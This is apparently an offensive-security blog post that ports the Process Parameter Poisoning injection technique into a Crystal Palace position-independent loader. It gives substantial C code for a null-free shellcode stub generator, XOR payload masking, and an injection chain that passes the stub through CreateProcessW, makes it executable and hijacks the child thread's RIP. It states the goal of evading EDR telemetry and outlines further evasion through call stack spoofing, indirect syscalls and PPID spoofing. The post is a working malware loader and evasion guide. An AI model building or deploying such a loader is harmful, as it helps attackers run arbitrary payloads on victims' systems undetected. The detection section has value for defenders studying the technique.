---
title: P³ in the Palace - Process Parameter Poisoning in Crystal Palace
date: 2026-10-01
author: vrls
#categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [security, redteam, windows, internals, process-injection, shellcode, evasion, edr, malware, offensive-security, tradecraft, pic, position-independent-code, crystal-palace, p3, process-parameter-poisoning, createprocessw, peb, ntapi, null-free, shellcodewriter, cobalt-strike, bof, call-stack-spoofing, apc, thread-hijacking, dfr, winapi, c, asm, research, windows-internals]
image: /assets/img/posts/2026/10/ec7a7352a39045188a6876aa5ba9764a5a97c8d7f5231d700933894ae30a2f9e.png #og:image
description: A technical walkthrough of porting Process Parameter Poisoning (P³) to Crystal Palace PIC including a C implementation of ShellCodeWriter that generates null-free shellcode stubs compatible with CreateProcessW parameter injection, without triggering WriteProcessMemory or VirtualAllocEx telemetry.
#image:
#  src: /assets/img/posts/YYYY/MM/MD5SUMHASH.png
#  width: 350   # in pixels
#  height: 350   # in pixels
#permalink: /posts/YYYY/MM/title/  # compatiblity old post links
---




## 1. Introduction


Process injection techniques live and die by the APIs they touch. The classic sequence of `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` is so well-known that most EDRs flag it on sight. 
[Process Parameter Poisoning (P³)](https://github.com/Orange-Cyberdefense/p3-loader/blob/main/Whitepaper-P3.pdf), published by Max Hirschberger and Ogulcan Ugur in July 2026, sidesteps this entirely by leveraging `CreateProcessW` as the write primitive, smuggling shellcode into a child process through fields that Windows copies automatically into the new process's `RTL_USER_PROCESS_PARAMETERS` structure without any explicit allocation, write, or remote thread.

The technique ships as a C++ proof of concept. This article documents porting it to [Crystal Palace](https://tradecraftgarden.org), the PIC linker and tradecraft framework. Along the way, a C implementation of p3-loader's [ShellCodeWriter](https://github.com/Orange-Cyberdefense/p3-loader/blob/main/P3-Loader/ShellCodeWriter.cpp) class is built from scratch: a null-free stub generator that overcomes the main constraint of the technique, since process parameters are null-terminated strings and any shellcode containing a `0x00` byte gets silently truncated before reaching the child.

The result is a working Crystal Palace PICO that takes an arbitrary payload, generates a null-free decoder stub, injects it via `ShellInfo`, and redirects the child's main thread via `NtSetContextThread`, without calling `VirtualAllocEx`, `WriteProcessMemory`, or `CreateRemoteThread` at any point. The final section maps the remaining detection surface honestly and outlines where the next iteration leads.


- Repository: [https://github.com/joaovarelas/P3-Crystal](https://github.com/joaovarelas/P3-Crystal) 


---



## 2. Background


### 2.1 Process Parameter Poisoning (P³)

When `CreateProcessW` creates a new process, it copies several caller-supplied parameters directly into the child's `RTL_USER_PROCESS_PARAMETERS` structure in the PEB. This happens internally, without any call to `VirtualAllocEx` or `WriteProcessMemory`. Three fields are large enough to carry shellcode: `CommandLine` (`lpCommandLine`), the environment block (`lpEnvironment`), and `ShellInfo` (`lpReserved` in `STARTUPINFOW`).

`ShellInfo` is the cleanest injection point. Unlike `CommandLine`, it imposes no length restrictions tied to `MAX_PATH` and does not affect the visible command line of the spawned process. According to Microsoft's documentation, `lpReserved` is reserved for internal use with no further specification, making its abuse less likely to trigger content-based detection rules.

The execution chain after `CreateProcessW` returns involves no further write primitives. The injected data is located by reading the child's PEB via `NtQueryInformationProcess` and `NtReadVirtualMemory`, made executable with `NtProtectVirtualMemory`, and executed by redirecting the main thread's instruction pointer with `NtGetContextThread` and `NtSetContextThread`.

The original technique and C++ proof of concept were published by Max Hirschberger and Ogulcan Ugur at SensePost in 2026. The full whitepaper and loader implementation are available at [Orange-Cyberdefense/p3-loader](https://github.com/Orange-Cyberdefense/p3-loader).




### 2.2 Crystal Palace

Crystal Palace is a linker and linker script language for writing post-exploitation capability as position-independent code, published by Raphael Mudge under the Adversary Fan Fiction Writers Guild (AFF-WG) at [tradecraftgarden.org](https://tradecraftgarden.org). The output format is a PICO (Position-Independent Code Object), essentially a Cobalt Strike BOF without the Beacon API dependency. Crystal Palace is also the core framework taught in the [CRTO II](https://training.zeropointsecurity.co.uk/courses/red-team-ops-ii) course by ZeroPoint Security.

The features relevant to this project are: **DFR** (Dynamic Function Resolution), which replaces import tables with hash-based runtime resolution using `MODULE$Function` notation; `attach`, which rewrites call sites at link time to route through hook functions without touching source code; `+unwind`, which generates `.pdata` metadata so synthetic call frames survive `RtlVirtualUnwind`; and the `link`/`mask` resource system, which embeds XOR-encrypted payloads directly into the PICO binary.

Crystal Palace fits P³ naturally. The payload and the injection tradecraft are compiled and linked separately, the XOR masking of the shellcode resource is handled by the linker, and DFR keeps all Win32 and NT API calls out of the import table.

---

## 3. The Null-Byte Problem

All three injectable fields in `CreateProcessW` are treated as null-terminated Unicode strings. Windows copies them by scanning for the first null wide character (`0x0000`, two consecutive zero bytes). Since real-world shellcode almost always contains `0x00` bytes, passing it directly as `lpReserved` results in silent truncation at the first null byte. The child receives an incomplete stub and crashes on execution.

The original p3-loader addresses this with a C++ `ShellCodeWriter` class that generates a **null-free decoder stub**: a small piece of shellcode that itself contains no `0x00` bytes, but at runtime reconstructs the original payload, allocates executable memory for it, and jumps to it. This article ports that class to C, removing all C++ and stdlib dependencies so it can be compiled and merged directly into a Crystal Palace PICO. The caller passes an arbitrary payload (with nulls); the output is a self-contained stub safe to place in any null-terminated parameter.

The core primitive is `SetRAX`, taken directly from `ShellCodeWriter.cpp`, which loads any 64-bit value into `RAX` without emitting a `0x00` byte. For non-zero values it uses an XOR decomposition:

```c
uint64_t xb = 0x0101010101010101ULL;
// adjust xb so that xa = value ^ xb has no zero bytes
for (int i = 0; i < 8; i++)
    if (((uint8_t *)&value)[i] == 0x01)
        ((uint8_t *)&xb)[i] = 0x02;
uint64_t xa = value ^ xb;
// emits: mov rax, xa / mov r15, xb / xor rax, r15
```

Neither `xa` nor `xb` ever contains `0x00`. The zero bytes in the original value appear only at runtime in the target's registers, never in the shellcode bytes. The same encoding is applied to every value pushed onto the stack, including string arguments and function addresses.

API addresses (`VirtualAlloc`, `VirtualProtect`) are resolved in the injector process and embedded directly as immediates in the stub. This works because ASLR on Windows randomises module base addresses once at boot and shares them across all processes on the same session. The address of `VirtualAlloc` in the injector is identical to its address in the freshly created child.

```c
scw_init(&w, stub, sizeof(stub));
scw_load_and_call(&w,
    (u64)KERNEL32$VirtualAlloc,   // resolved here, valid in target
    (u64)KERNEL32$VirtualProtect,
    (const u8 *)unmasked_sc,      // your payload, nulls and all
    masked_sc->length);
// stub[0..w.len-1] is now null-free and ready for lpReserved
```


---


## 4. Porting ShellCodeWriter to C

### 4.1 Design Constraints for Crystal Palace PIC

Crystal Palace PIC compilation imposes constraints that make a direct C++ port impossible. The C implementation follows these rules:

- **No CRT or stdlib**: no `malloc`, `memcpy`, `string.h`. All memory is caller-managed.
- **No switch statements**: these generate jump tables, which break position-independent code. All branching uses `if/else`.

The `SCW` struct is the entire library state:

```c
typedef struct {
    u8  *buf;          // output buffer (caller-provided)
    int  len;          // bytes written so far
    int  cap;          // buffer capacity
    int  stack_bytes;  // runtime RSP consumption tracker
} SCW;
```

No heap allocation anywhere. The caller declares `u8 stub[SCW_BUF_LARGE]` on the stack and passes it in.



### 4.2 Core Primitives

**`scw_set_rax`** is the foundation. Every value that appears in the stub addresses, sizes, string chunks passes through it. For zero it emits `xor rax, rax` (3 bytes, no nulls). For everything else it uses the XOR decomposition from section 3. Because `scw_set_rax` handles any `u64`, pushing a string like `"user32.dll\0"` chunk by chunk is safe even though the string contains null bytes those nulls appear only at runtime in the target's stack memory, never in the emitted shellcode bytes.

**`scw_push_buffer`** pushes an arbitrary byte array onto the runtime stack in 8-byte chunks, in reverse order, so that `rsp` points to `data[0]` after all pushes:

```c
void scw_push_buffer(SCW *w, const u8 *data, int len) {
    int padded = (len + 7) & ~7;
    for (int i = padded - 8; i >= 0; i -= 8) {
        u64 val = 0;
        for (int j = 0; j < 8; j++)
            if (i + j < len)
                ((u8 *)&val)[j] = data[i + j];
        scw_push_value(w, val);  // set_rax + push rax
    }
}
```

**`scw_call`** handles Win64 16-byte stack alignment before every call. It matches p3-loader's `Call()` exactly: if `stack_bytes % 16 != 0`, it emits `sub rsp, 8` and increments `stack_bytes` permanently. There is no cleanup after the call. This is intentional the alignment bytes stay consumed so all subsequent `scw_set_arg_sp` offset calculations remain correct without any additional bookkeeping.

```c
void scw_call(SCW *w, u64 addr) {
    if (w->stack_bytes % 16) {
        // sub rsp, 8  →  48 83 EC 08
        w->stack_bytes += 8;
    }
    scw_set_rax(w, addr);
    // call rax  →  FF D0
}
```



### 4.3 The Primary Function: `scw_load_and_call`

This is a direct C port of `LoadAndCallShellCode` from `ShellCodeWriter.cpp`. The generated stub performs five operations inside the target process:

```
┌─────────────────────────────────────────────────────┐
│  1. push sc[0..sc_len-1]   null-free XOR-encoded    │
│  2. VirtualAlloc(RW)        allocate sc_len bytes    │
│  3. byte copy loop          stack → allocation       │
│  4. VirtualProtect(RX)      flip protection          │
│  5. jmp r12                 execute payload          │
└─────────────────────────────────────────────────────┘
```

The key implementation detail is `pos_sc` tracking. It is captured after `scw_push_buffer` but before shadow space allocation:

```c
scw_push_buffer(w, sc, sc_len);
int pos_sc = w->stack_bytes;   // anchor: position of shellcode on stack

// sub rsp, 32  (shadow space shared by both VirtualAlloc and VirtualProtect)
w->stack_bytes += 32;

// VirtualAlloc call...

// rcx = rsp + (stack_bytes - pos_sc)  →  pointer to shellcode on stack
scw_set_arg_sp(w, 0, w->stack_bytes - pos_sc);
```

As `stack_bytes` grows through shadow space allocation and any alignment consumed by `scw_call`, the expression `stack_bytes - pos_sc` always evaluates to the correct byte offset from the current `rsp` to the shellcode bytes. The same offset is reused for `VirtualProtect`'s `lpflOldProtect` argument, pointing into the shellcode's stack copy as scratch memory identical to p3-loader's design.

One shadow space block is allocated once before `VirtualAlloc` and reused for the `VirtualProtect` call. No second `sub rsp, 32` is emitted between them.


---


## 5. Crystal Palace Integration

### 5.1 Project Structure

The project follows a standard Crystal Palace layout:

```makefile
.
├── Makefile
├── loader.spec
└── src/
    ├── main.c          # go() entry point, full P³ flow
    ├── services.c      # DFR resolvers (resolve, resolve_ext)
    ├── utils.c         # helpers
    ├── shellwriter.c   # null-free stub generator
    ├── dfr.h           # NTAPI / Win32 DFR declarations
    ├── utils.h         # RESOURCE struct, macros
    └── shellwriter.h   # SCW struct and API
```

The Makefile compiles each source file to a separate `.o`, then hands everything to the Crystal Palace linker (`cpl`). The shellcode is read from disk, hex-encoded, and passed as a variable `$SC` at link time:

```makefile
SC_HEX_DATA := $(shell xxd -p $(SCFILE) | tr -d '\n')

link.x64:
    cpl link loader.spec bin/main.x64.o bin/out.x64.bin SC=$(SC_HEX_DATA)
```

`loader.spec` drives the rest. The relevant sections are the object loading and the payload embedding:

```yaml
x64:
  load "bin/main.x64.o"
    make pic +gofirst +blockparty +disco +mutate +regdance +shatter +unwind

  load "bin/services.x64.o"
    merge

  load "bin/utils.x64.o"
    merge

  load "bin/shellwriter.x64.o"
    merge
	
  dfr "resolve" "ror13" "KERNEL32, KERNELBASE, NTDLL"
  dfr "resolve_ext" "strings"
	
  mergelib "../tcg/libtcg/libtcg.x64.zip"

  generate $KEY 64

  push $KEY
    preplen
    link "mask"

  push $SC
    mask "xor" $KEY
    preplen
    link "sc"

  export
```

`generate $KEY 64` produces a random 64-byte XOR key at link time. The shellcode is masked with it and both resources key and masked shellcode are embedded in the PICO with `preplen`/`link`. Crystal Palace handles the masking; the loader only needs to XOR them back at runtime.


### 5.2 The Full P³ Flow

`go()` in `main.c` implements the complete injection chain. Each step maps directly to a phase of the P³ technique.

**Unmask the payload**

```c
RESOURCE *masked_sc = (RESOURCE *)GETRESOURCE(__SC__);
RESOURCE *mask_key  = (RESOURCE *)GETRESOURCE(__MASK__);

char unmasked_sc[masked_sc->length];
for (int i = 0; i < masked_sc->length; i++)
    unmasked_sc[i] = masked_sc->value[i] ^ mask_key->value[i % mask_key->length];
```

**Generate the null-free stub**

This is the single function call that replaces the null problem entirely. The stub is zeroed first so the null WCHAR terminator exists after the last stub byte. Without it, `CreateProcessW` would scan past the buffer looking for `0x0000` and copy garbage into the child.

```c
u8 stub[SCW_BUF_LARGE];
for (int i = 0; i < SCW_BUF_LARGE; i++) stub[i] = 0;

SCW w;
scw_init(&w, stub, sizeof(stub));
scw_load_and_call(&w,
    (u64)KERNEL32$VirtualAlloc,
    (u64)KERNEL32$VirtualProtect,
    (const u8 *)unmasked_sc,
    masked_sc->length);
```

**Spawn the target process**

```c
STARTUPINFOW si = {0};
si.cb         = sizeof(si);
si.lpReserved = (LPWSTR)stub;   // null-free stub, not the raw payload

KERNEL32$CreateProcessW(lpApplicationWide, NULL, NULL, NULL,
                        FALSE, 0, NULL, NULL, &si, &pi);
```

**Walk the child PEB to locate the stub**

```c
NTDLL$NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen);
NTDLL$NtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(pebLocal), &bytesRead);
NTDLL$NtReadVirtualMemory(pi.hProcess, pebLocal.ProcessParameters, &parameters, sizeof(parameters), &bytesRead);

PVOID shellcode = (PVOID)parameters.ShellInfo.Buffer;
```

**Make the stub executable and hijack RIP**

With the stub address recovered from `ShellInfo.Buffer`, the page it lives on is flipped to `PAGE_EXECUTE_READ`. Because `NtProtectVirtualMemory` requires a page-aligned base address, the stub address is rounded down to the nearest page boundary and the size adjusted to compensate. The child's main thread context is then read, `RIP` is overwritten with the stub address, and the modified context is written back. The thread was never suspended.

```c
ULONG_PTR aligned = (ULONG_PTR)shellcode & ~(4096 - 1);
SIZE_T    size    = (SIZE_T)w.len + ((ULONG_PTR)shellcode - aligned);
PVOID     base    = (PVOID)aligned;
ULONG     old;

NTDLL$NtProtectVirtualMemory(pi.hProcess, &base, &size, PAGE_EXECUTE_READ, &old);

CONTEXT ctx __attribute__((aligned(16))) = {0};
ctx.ContextFlags = CONTEXT_CONTROL;
NTDLL$NtGetContextThread(pi.hThread, &ctx);

ctx.Rip = (DWORD64)shellcode; // force RIP to redirect execution
NTDLL$NtSetContextThread(pi.hThread, &ctx);
```


**The result**

![P³ loader executing msgbox payload via ShellInfo injection](/assets/img/posts/2026/10/9b0187f6cb5e0a7a2802650fae5081ee5147abb5cf331aec739292ab0970fe64.png)
_winver.exe spawned as the sacrifical process, msgbox shellcode executing via ShellInfo parameter injection_



The full flow in one diagram:

```
Makefile
  └─ xxd payload → SC_HEX_DATA → loader.spec (XOR masked, embedded)
       └─ Crystal Palace PICO (go)
            ├─ unmask payload resource
            ├─ scw_load_and_call → null-free stub
            ├─ CreateProcessW(lpReserved = stub)
            │    └─ OS copies stub → child RTL_USER_PROCESS_PARAMETERS.ShellInfo
            ├─ NtQueryInformationProcess + NtReadVirtualMemory → ShellInfo.Buffer
            ├─ NtProtectVirtualMemory(child, stub region, RX)
            └─ NtSetContextThread(child.RIP = ShellInfo.Buffer)
                 └─ child executes stub
                      ├─ VirtualAlloc(RW)
                      ├─ copy payload from stack
                      ├─ VirtualProtect(RX)
                      └─ jmp r12 → payload runs
```

---


## 6. Current Detection Surface and Next Steps

This implementation is a faithful port of the p3-loader proof of concept into Crystal Palace. It works, but it makes no attempt to hide what it is doing beyond what the technique already provides by avoiding `VirtualAllocEx` and `WriteProcessMemory`.

**What remains detectable:**

- **Unbacked return addresses.** Every sensitive NT call (`NtProtectVirtualMemory`, `NtSetContextThread`) is made directly from `go()`, which lives in private unbacked memory. Any EDR that walks the call stack on these callbacks will see a return address pointing into an anonymous `MEM_PRIVATE` region.
- **NtProtectVirtualMemory on process-parameter pages.** The stub lives in `RTL_USER_PROCESS_PARAMETERS.ShellInfo`. Flipping that specific region to `PAGE_EXECUTE_READ` is a named detection rule in the original p3-loader whitepaper.
- **The Protect → SetContext sequence.** `NtProtectVirtualMemory` followed closely by `NtSetContextThread` on a freshly created process is a high-confidence behavioural indicator regardless of which pages are involved.
- **PPID.** The child process is spawned with the loader as the parent. Any process tree analysis immediately flags this relationship.

**Next steps:**

1. **Call stack spoofing** — wrap the sensitive NT calls with Crystal Palace `attach` hooks that set up synthetic frames (`BaseThreadInitThunk` → `RtlUserThreadStart`) before dispatching. Combined with `+unwind` in the spec, every frame visible during the EDR callback is file-backed and signed.
2. **Indirect syscalls** — bypass userland hooks on ntdll by dispatching NT calls through a clean syscall instruction inside an unhooked stub, with the SSN resolved at runtime via the PEB.
3. **Avoid making param pages executable** — allocate a fresh region in the child, copy the stub there via a gadget, and protect that instead of the `ShellInfo` page directly.
4. **PPID spoofing** — use `UpdateProcThreadAttribute` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to reparent the child under a legitimate process such as `explorer.exe`.

Each of these maps cleanly onto Crystal Palace primitives that already exist. They are left for a follow-up post.


---


## 7. References

[1] M. Hirschberger and O. Ugur, "Process Parameter Poisoning (P³)," SensePost, Jul. 2026. [https://sensepost.com/blog/2026/process-parameter-poisoning/](https://sensepost.com/blog/2026/process-parameter-poisoning/)

[2] modexp, "Windows Process Injection: Command Line and Environment Variables," modexp.wordpress.com, Jul. 2020 (deleted; archived copy available). [https://web.archive.org/web/20241211190548/https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/](https://web.archive.org/web/20241211190548/https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/)

[3] Orange-Cyberdefense, "P³-Shellcode Loader," GitHub, 2026. [https://github.com/Orange-Cyberdefense/p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)

[4] R. Mudge, "Crystal Palace Documentation," Adversary Fan Fiction Writers Guild, 2025. [https://tradecraftgarden.org/docs.html](https://tradecraftgarden.org/docs.html)

[5] rasta-mouse, "Crystal-Kit," GitHub, 2025. [https://github.com/rasta-mouse/Crystal-Kit](https://github.com/rasta-mouse/Crystal-Kit)

[6] NtDallas, "Draugr," GitHub, 2025. [https://github.com/NtDallas/Draugr](https://github.com/NtDallas/Draugr)

[7] joaovarelas, "P3-Crystal," GitHub, 2026. [https://github.com/joaovarelas/P3-Crystal](https://github.com/joaovarelas/P3-Crystal)

---